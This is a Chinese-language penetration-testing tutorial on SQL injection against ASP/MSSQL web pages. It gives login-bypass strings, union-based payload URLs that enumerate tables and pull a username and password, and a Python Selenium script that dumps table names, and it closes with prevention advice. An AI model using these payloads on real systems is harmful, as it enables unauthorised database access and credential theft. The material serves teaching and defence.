# 滲透基礎之數據庫原理

 Google搜索

首先，強烈推薦使用Google搜索

Google搜索提供強大的功能，給你精準的結果

 intitle:xia-tian-liang

搜索網頁標題包含xia-tian-liang字符的網頁。

 inurl:cbi

搜索包含特定字符cbi的URL。

 intext:cbi

搜索網頁正文內容包含特定字符cbi的網頁。

 filetype:ppt

搜索制定類型的文件，返回所有以ppt結尾的文件URL。

 site

找到與指定網站有聯繫的URL。

萬能密碼原理

萬能密碼通常是指開發人員在開發過程中使用超級管理員進行開發，開發完成後沒有過濾掉這些常用的超級管理員；另一種是存在SQL漏洞管理員賬號。

1.萬能密碼：用戶名 admin、密碼admin，用戶名admin、密碼123456

2.萬能密碼：用戶名 'or'='or'、密碼 'or'='or'

 原理解釋：假設用戶登錄對應的語句爲：

 select name, pwd from login where name='' and pwd='';

 如果用戶名輸入正確則直接登錄，否則提示用戶名或密碼錯誤，使用萬能密碼後的SQL語句如下：

 select name, pwd from login where name=''or'='or'' and pwd=''or'='or'';

 核心代碼，兩個單引號匹配，即name=''，然後or連接，單引號等於單引號\('='\)這是恆成立的，緊接着or連接兩個單引號\(''\)，同理密碼pwd。這樣or連接的\('='\)是恆成立的，故返回結果爲真，導致直接登錄。

3.萬能密碼：用戶名 'or''='、密碼'or''='

 原理解釋：此時對應的SQL語句如下：

 select name, pwd from login where name=''or''='' and pwd=''or''='';

4.萬能密碼：用戶名'or'='--、密碼'or'='--

 原理解釋：此時對應的SQL語句如下：

 select name, pwd from login where name=''or'='--' and pwd=''or'='--';

防範措施：

1.開發人員開發完成後，過濾掉admin等常用賬號或修改密碼；

2.當用戶第一次登錄的時候，對簡單的密碼進行修改提示，防止暴力破解；

3.用戶名或密碼屏蔽掉單引號\('\)、等號\(=\)、註釋\(--\)等特殊字符；

4.對嘗試SQL注入的IP地址進行報警提示或日誌記錄

數據庫解讀SQL注入攻防原理

1.數據庫如何判斷注入點

判斷注入點的方法很多，比如show.asp?code=115' 加單引號，show.asp?code=115-1 減1，這裏介紹一個經典的方法。

\(1\) http://xxxxx/show.asp?code=115' and 1=1 -- \(正常顯示\)

對應的SQL語句：

select .... from table where code='115' and 1=1 -- and xxxx;

單引號\('\)匹配code='115，然後and連接，1=1恆成立，註釋\(--\)掉後面語句。

\(2\) http://xxxxx/show.asp?code=115' and 1=2 -- \(錯誤顯示\)

對應的SQL語句：

select .... from table where code='115' and 1=2 -- and xxxx;

單引號\('\)匹配code='115，然後and連接，1=2恆錯誤，註釋\(--\)掉後面語句。

2.數據庫如何判斷字段總數 order by

\(1\) http://xxxxx/show.asp?code=115' order by 1 -- \(正常顯示\)

對應的SQL語句：

select .... from table where code='115' order by 1 -- and xxxx;

按照1個字段進行排序，正常顯示錶示該URL對應的SQL語句至少一個字段。

\(2\) http://xxxxx/show.asp?code=115' order by 10 -- \(正常顯示\)

對應的SQL語句：

select .... from table where code='115' order by 10 -- and xxxx;

依次按照字段增加網上進行排序，如果提示錯誤order by 11，則表示共10個字段。

\(3\) http://xxxxx/show.asp?code=115' order by 11 -- \(錯誤顯示\)

3.數據庫獲取顯示位 union

在得到字段個數後，需要獲取字段位置，則使用union或union all。其中union表示將兩個select結果整體顯示，併合並相同的結果，union all顯示全部結果。

http://xxxxx/show.asp?code=115' union all select 1,...,null --

依次替換成數字，測試哪幾個字段有結果，如果報錯則替換回null。最終的結果爲：

show.asp?code=115' union all select 1,null,3,null,null,6,7,8,9,10 --

對應的SQL語句爲：

select .... from table where code='115' union all select 1,null,3,null,null,6,7,8,9,10 -- xxxx;

4.數據庫顯示錯誤網頁及對應數據 db\_name

該網站使用的數據庫爲MSSQL，則一定特定的字段需要知道：

 host\_name\(\)：連接數據庫服務器的計算機名稱

 @@version：獲取數據庫版本號

 db\_name\(\)：數據庫的庫名稱

 @@servername：當前數據庫計算機的名稱=host\_name\(\)

 \(1\) http://xxxxx/show.asp?code=-1' union all

select 1,null,3,null,null,6,host\_name\(\),@@version,db\_name\(\),10 --

輸出結果如下所示：

 附件1：AYD

 附件2：Microsoft SQL Server....

 附件3：ahykd\_new

其中數據庫的名稱就是ahykd\_new，接下來相同的道理獲取數據庫所有表及列。

SQL Server自帶系統對象表，當前數據庫所有字段。

sysobjects 表名 syscolumns 列名

其中，name表示對象名（表名），id表示表編號，type表示對象類型，其值爲U表示用戶表，S表示系統表，C約束，PK主鍵等。

sysobjects 和 syscolumns 之間以id互相對應，一個表名在sysobjects得到id後可以在syscolumns找到它的列名。

 重點知識：

a.查看所有表名語句 select name from sysobjects where type='U';

b.詢表table1的所有字段名稱 select name from syscolumns where id=object\_id\('table1'\)；

通過子查詢一個升序，一個降序獲取第二個值，同理第三個top 3。 下面通過Python定義一個爬蟲不斷訪問top n，獲取所有的表名，代碼如下：

事先下載：

cmd打開之後

pip install selenium

```text
# coding=utf-8from selenium import webdriver             driver = webdriver.Firefox()    #查询表的名字#(select top 1 name from (select top " + str(i) +" name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc)i = 1while i<=87:    url = "http://...tztgxx.aspx?code=-115' union all select 1,null,1,null,null,6,host_name(),@@servername,(select top 1 name from (select top " + str(i) +" name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc),10 --"    #print url    driver.get(url)    elem = driver.find_element_by_xpath("//form[@name='form1']/div[2]/table/tbody/tr[7]")    print elem.text    i = i + 1
```

7.數據庫返回用戶名和密碼

\(1\) http://xxxxx/show.asp?code=-1' union all

select 1,null,3,null,null,6,7,8,\(select top 1 usr\_name from usr\),10 --

輸出結果如下所示：

 附件1：7

 附件2：8

 附件3：2016001

輸出用戶名2016001，在搜索密碼。

\(2\) http://xxxxx/show.asp?code=-1' union all

select 1,null,3,null,null,6,7,8,

\(select passwd from usr where usr\_name='2016001'\),10 --

輸出結果如下所示：

 附件1：7

 附件2：8

 附件3：123456

輸出用戶名2016001，密碼123456，此時即可登錄，通過Python可以獲取所有值。

防止SQL注入

上面通過數據庫原理進行了詳細的講解，這種網站基本很少存在了，幾乎爲0，更多的網頁都有相關的屏蔽的。比如：

1.在URL設置不允許非法字符，如單引號、等號、註釋--、減號，提示非法參數；

2.在URL設置不允許SQL常見的關鍵詞，如and、select、or、insert等；

3.傳遞的id=115參數必須爲數字才能正常跳轉，否則跳轉錯誤

4.服務器啓用SQL注入攔截功能，提示當前網頁的 URL / POST / COOKIES中包含了特定的 SQL字符而被防火牆攔截，因爲可能通過POST、Cookies進行攻擊。各方面都需要做到防禦。

5.可以使用Javascript在客戶端進行不安全字符屏蔽，也可以在jsp中調用該函數檢查是否包函非法字符，或使用正則表達式過濾傳入的參數，防止SQL從URL注入。

